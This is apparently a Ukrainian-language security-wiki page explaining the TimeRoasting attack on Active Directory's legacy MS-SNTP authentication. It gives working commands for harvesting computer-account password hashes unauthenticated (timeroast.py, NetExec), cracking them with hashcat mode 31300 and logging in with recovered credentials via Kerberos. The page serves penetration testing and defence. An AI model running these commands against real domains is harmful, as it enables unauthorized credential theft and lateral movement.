# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting використовує вразливість legacy-аутентифікації MS-SNTP. Неаутентифікований клієнт може надіслати 68-байтовий запит, що містить вибраний RID облікового запису комп’ютера. Для експлуатованого legacy-шляху контролер домену отримує authenticator відповіді через Netlogon, використовуючи NT hash облікового запису комп’ютера (секрет пароля, похідний від MD4), що надає зловмиснику пару challenge/MAC, придатну для офлайн-вгадування пароля (режим Hashcat 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Розділи 3.1.5.1 і 4 MS-SNTP описують поведінку запиту та відповіді:<sup>[[1]](#references)</sup>
![TimeRoasting: Див. розділ 3.1.5.1 "Authentication Request Behavior" і 4 "Protocol Examples" в офіційній специфікації MS-SNTP для отримання подробиць](../../images/Pasted%20image%2020250709114508.png)
Коли `ExtendedAuthenticatorSupported` має значення false, запит зберігає RID у молодших 31 біті Key Identifier authenticator і біт селектора у старшому біті. Сервер перевіряє довжину 68 байт, отримує RID, запитує Netlogon обчислити можливі контрольні суми, вибирає одну з них за допомогою старшого біта, обнуляє Key Identifier відповіді та повертає вибрану контрольну суму.<sup>[[1]](#references)</sup>

Crypto-checksum базується на MD5 (див. 3.2.5.1.1) і може бути зламаною офлайн, що робить можливою атаку roasting.<sup>[[1]](#references)</sup>

## Як здійснити атаку

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) — скрипти для Timeroasting від Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Практична атака (unauth) за допомогою NetExec + Hashcat

- Модуль `timeroast` у NetExec може перераховувати RIDs комп’ютерів, збирати MAC-адреси MS-SNTP без автентифікації та виводити хеші `$sntp-ms$`, готові до cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Зламати офлайн за допомогою Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Відновлений пароль у відкритому вигляді відповідає паролю облікового запису комп’ютера. Спробуйте безпосередньо використати його як обліковий запис комп’ютера через Kerberos (-k), коли NTLM вимкнено:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Операційні примітки
- Переконайтеся, що час синхронізовано, перш ніж використовувати відновлені credentials з Kerberos. Віддавайте перевагу підтримуваному NTP-клієнту, такому як `chronyd`/`systemd-timesyncd`; `ntpdate` наведено тут як поширену команду для лабораторного середовища: `sudo ntpdate <dc_fqdn>`.
- За потреби згенеруйте krb5.conf для AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Пізніше зіставте RIDs із principals через LDAP/BloodHound, щойно отримаєте будь-який authenticated foothold.

## References

- [1] [MS-SNTP: Простий мережевий протокол часу Microsoft](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper про Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — вихідний код модуля `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Режим Hashcat 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
